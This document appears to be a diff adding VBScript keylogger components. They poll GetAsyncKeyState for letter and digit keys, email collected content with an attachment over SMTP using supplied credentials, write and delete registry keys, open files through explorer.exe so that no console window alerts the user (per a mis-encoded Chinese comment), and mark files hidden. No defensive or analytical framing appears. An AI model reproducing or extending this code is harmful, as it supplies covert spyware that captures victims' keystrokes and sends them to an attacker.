+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(71) = -32767 Then
+		    GetThePressKey = "G"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(72) = -32767 Then
+		    GetThePressKey = "H"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(73) = -32767 Then
+		    GetThePressKey = "I"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(74) = -32767 Then
+		    GetThePressKey = "J"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(75) = -32767 Then
+		    GetThePressKey = "K"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(76) = -32767 Then
+		    GetThePressKey = "L"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(77) = -32767 Then
+		    GetThePressKey = "M"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(78) = -32767 Then
+		    GetThePressKey = "N"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(79) = -32767 Then
+		    GetThePressKey = "O"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(80) = -32767 Then
+		    GetThePressKey = "P"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(81) = -32767 Then
+		    GetThePressKey = "Q"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(82) = -32767 Then
+		    GetThePressKey = "R"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(83) = -32767 Then
+		    GetThePressKey = "S"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(84) = -32767 Then
+		    GetThePressKey = "T"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(85) = -32767 Then
+		    GetThePressKey = "U"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(86) = -32767 Then
+		    GetThePressKey = "V"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(87) = -32767 Then
+		    GetThePressKey = "W"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(88) = -32767 Then
+		    GetThePressKey = "X"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(89) = -32767 Then
+		    GetThePressKey = "Y"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(90) = -32767 Then
+		    GetThePressKey = "Z"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(48) = -32767 Then
+		    GetThePressKey = "[0]"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(49) = -32767 Then
+		    GetThePressKey = "[1]"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(50) = -32767 Then
+		    GetThePressKey = "[2]"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(51) = -32767 Then
+		    GetThePressKey = "[3]"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(52) = -32767 Then
+		    GetThePressKey = "[4]"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(53) = -32767 Then
+		    GetThePressKey = "[5]"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(54) = -32767 Then
+		    GetThePressKey = "[6]"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(55) = -32767 Then
+		    GetThePressKey = "[7]"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(56) = -32767 Then
+		    GetThePressKey = "[8]"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(57) = -32767 Then
+		    GetThePressKey = "[9]"
+		    Exit Function
+	    End If
+	End With
+End Function
+
+'**************************************** ·¢ËÍÓÊ¼ş ****************************************
+
+Function SendEmail(senderAddress, senderPassword, sendeeAddress, backupAddress, mailTitle, mailContent, mailAttachment)
+	Const MS_Space = "http://schemas.microsoft.com/cdo/configuration/" 'ÅäÖÃ¿Õ¼ä
+	
+    Dim objEmail
+    Set objEmail = CreateObject("CDO.Message")
+    Dim strSenderID
+    strSenderID = Split(senderAddress, "@", -1, vbTextCompare)
+    
+    objEmail.From = senderAddress		'¼Ä¼şÈËµØÖ·
+    objEmail.To = sendeeAddress			'ÊÕ¼şÈËµØÖ·
+    If backupAddress <> "" Then
+		objEmail.CC = backupAddress		'±¸ÓÃµØÖ·
+    End If
+    objEmail.Subject = mailTitle   		'ÓÊ¼şÖ÷Ìâ
+    objEmail.TextBody = mailContent 	'ÓÊ¼şÄÚÈİ
+    If MailAttachment <> "" Then
+		objEmail.AddAttachment mailAttachment	'¸½¼şµØÖ·
+    End If
+    
+    With objEmail.Configuration.Fields
+		.Item(MS_Space & "sendusing") = 2                        	'·¢ĞÅ¶Ë¿Ú
+        .Item(MS_Space & "smtpserver") = "smtp." & strSenderID(1)   '·¢ĞÅ·şÎñÆ÷
+        .Item(MS_Space & "smtpserverport") = 25                     'SMTP·şÎñÆ÷¶Ë¿Ú
+        .Item(MS_Space & "smtpauthenticate") = 1                    'CDObasec
+        .Item(MS_Space & "sendusername") = strSenderID(0)           '¼Ä¼şÈËÓÊÏäÕË»§Ãû
+        .Item(MS_Space & "sendpassword") = senderPassword           'ÕÊ»§ÃûÃÜÂë    
+        .Update
+    End With
+    
+	Err.Clear
+    objEmail.Send '·¢ËÍÓÊ¼ş
+	
+    Set objEmail = Nothing
+    SendEmail = True
+    
+    If Err Then
+		'WSCript.Echo Err.Description
+        Err.Clear
+        SendEmail = False
+    End If
+End Function
+
+'**************************************** ¹¤¾ßº¯Êı ****************************************
+
+Sub WriteReg(key, value, typeName) 'Ğ´×¢²á±í
+	Dim objShell
+	Set objShell = CreateObject("WScript.Shell")
+	If typeName = "" Then
+		objShell.RegWrite key, value
+	Else
+		objShell.RegWrite key, value, typeName
+	End If
+	Set objShell = Nothing
+End Sub
+
+Function ReadReg(key) '¶ÁÈ¡×¢²á±í£¬ËÑË÷key£¬·µ»ØËùÔÚÂ·¾¶
+	On Error Resume Next
 	Dim objShell
 	Set objShell = CreateObject("WScript.Shell")
 	ReadReg = objShell.RegRead(key)
 	Set objShell = Nothing
 End Function
 
-Sub WriteReg(Key, Value, TypeName)'å†™æ³¨å†Œè¡¨
-	Dim tmps
-	Set tmps = CreateObject("WScript.Shell")
-	If vtype = "" Then
-		tmps.RegWrite Key, Value
-	Else
-		tmps.RegWrite Key, Value, TypeName
-	End If
-	Set tmps = Nothing
-End Sub
-
-Sub DeleteReg(targetPath) 'åˆ é™¤æ³¨å†Œè¡¨
+Sub DeleteReg(targetPath) 'É¾³ı×¢²á±í
 	On Error Resume Next
 	Dim objShell
 	Set objShell = CreateObject("WScript.Shell")
 	objShell.RegDelete targetPath
 	Set objShell = Nothing
+End Sub
+
+Sub OpenFile(filePath)
+	Dim objShell
+	Set objShell = CreateObject("WScript.Shell")
+	objShell.Run("explorer.exe " & filePath) '²»Ê¹ÓÃCMD´ò¿ª£¬·ÀÖ¹²úÉúºÚ¿ò±»ÓÃ»§·¢¾õ
+	Set objShell = Nothing
+End Sub
+
+Sub HideFile(filePath)
+	Dim objFileSystem, objFile
+	Set objFileSystem = WScript.CreateObject("Scripting.FileSystemObject")
+	Set objFile = objFileSystem.GetFile(filePath)
+	objFile.Attributes = 2 '0-ÆÕÍ¨ 1-Ö»¶Á 2-Òş²Ø 4-ÏµÍ³
+	Set objFileSystem = Nothing
+	Set objFile = Nothing
 End Sub
